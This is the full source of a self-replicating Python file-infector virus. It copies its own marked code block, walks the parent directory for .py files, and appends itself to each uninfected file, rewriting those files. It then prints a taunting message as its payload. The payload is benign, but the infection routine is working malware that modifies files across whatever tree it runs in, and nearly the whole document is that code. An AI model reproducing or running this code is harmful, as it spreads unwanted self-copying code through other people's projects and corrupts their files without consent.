##### VIRUS START #####
import sys
import threading
import os


def copyvirus():
    # Copy virus code
    virus_code = []
    in_virus = False
    in_payload = False

    with open(sys.argv[0], 'r') as f:
        for line in f.readlines():
            if line == "##### VIRUS START #####\n":
                in_virus = True
            if in_virus:
                if in_payload:
                    pass
                virus_code.append(line)
                if line == "##### VIRUS PAYLOAD #####\n":
                    in_payload = True

            if line == "##### VIRUS END #####\n":
                break
        f.close()
    return virus_code


def findfiles():
    # Find python files
    python_files = []
    print("\nFiles:")
    for root, dirs, files in os.walk(".."):
        for name in files:
            if name.endswith(".py"):
                print(os.path.join(root, name))
                python_files.append(os.path.join(root, name))
                # print(pathlib.Path(os.path.join(root, name)))
    return python_files


def infectfiles(python_files, virus_code):
    # Infect files
    for file in python_files:
        infected = False
        with open(file, 'r') as f:
            code = f.readlines()
            f.close()
        for line in code:
            if line == "##### VIRUS START #####\n":
                infected = True
                break
        if not infected:
            new_code = []
            new_code.extend(code)
            new_code.append("\n\n\n")
            new_code.extend(virus_code)
            with open(file, 'w') as f:
                f.writelines(new_code)
                f.close()


##### PAYLOAD START #####

def executepayload():
    print("You've been infected by my virus")


##### PAYLOAD END #####


def main():
    virus = copyvirus()
    files = findfiles()
    infectfiles(files, virus)
    executepayload()


t1 = threading.Thread(target=main)
t1.start()

##### VIRUS END #####